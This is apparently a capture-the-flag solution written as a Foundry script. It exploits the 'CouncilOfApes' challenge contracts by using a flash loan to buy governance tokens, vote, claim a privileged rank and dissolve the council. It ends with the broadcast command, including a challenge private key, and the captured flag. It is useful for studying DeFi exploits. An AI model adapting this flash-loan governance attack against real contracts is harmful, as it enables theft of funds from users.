// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./MyNewToken.sol";
import {IcyExchange} from "../../src/CouncilOfApes/IcyExchange.sol";
import {Setup} from "../../src/CouncilOfApes/Setup.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract AttackScript is Script{
    function run() public{
        vm.startBroadcast();
        new Attack{value: 10 ether}().exploit();
        console.log("Attack Success");
        vm.stopBroadcast();
    }
}

contract Attack {
    MyNewToken public myToken = new MyNewToken(address(this), "My New H4ck3r Token", "H4CK");
    Setup public setup = Setup(0x821B54EfB659A64d5b0A3145811b290A997705C0);
    IcyExchange public TARGET = setup.TARGET();
    address public _icyToken = address(TARGET.icyToken());

    bytes32 public theEvilWords = keccak256("Kevin come out of the basement, dinner is ready.");

    constructor() payable{
        require(msg.value == 10 ether);
    }


    function exploit() public {
        
        //Become an ape
        bytes32 holyWords = keccak256("I hereby swear to ape into every shitcoin I see, to never sell, to never surrender, to never give up, to never stop buying, to never stop hodling, to never stop aping, to never stop believing, to never stop dreaming, to never stop hoping, to never stop loving, to never stop living, to never stop breathing");
        TARGET.council().becomeAnApe(holyWords);

    
        // create a pool on IcyExchange
        myToken.approve(address(TARGET), 100_000);
        TARGET.createPool{value: 1 ether}(address(myToken));

        // Take flash loan
        myToken.approve(address(TARGET), type(uint256).max); // we dont know how many tokens it needs, give as much as possible
        TARGET.collateralizedFlashloan(address(myToken), 1_000_000_000, address(this));

    }

    function receiveFlashLoan(uint256 amount) public{
        TARGET.icyToken().approve(address(TARGET.council()), amount);
        TARGET.council().buyBanana(amount);

        TARGET.council().vote(address(this), amount);
        TARGET.council().claimNewRank();
        
        TARGET.council().issueBanana(amount, address(this));
        TARGET.council().sellBanana(amount);

        TARGET.icyToken().approve(address(TARGET), amount);

        TARGET.council().dissolveCouncilOfTheApes(theEvilWords);
    }

    fallback() external payable { }
}


//forge script script/CouncilOfApesAttack/CouncilOfApesAttack.s.sol:AttackScript --rpc-url http://34.159.107.195:18547/d2b4e63e-b682-43b0-b951-08fde04fc2da --private-key 0x7d032eb1113427e451f9e7687c54f96e32ae9f1d4fffac69558de1a750e7de5d --broadcast
//gctf{M0nkee5_4re_inD33d_t0g3ther_str0ng3r}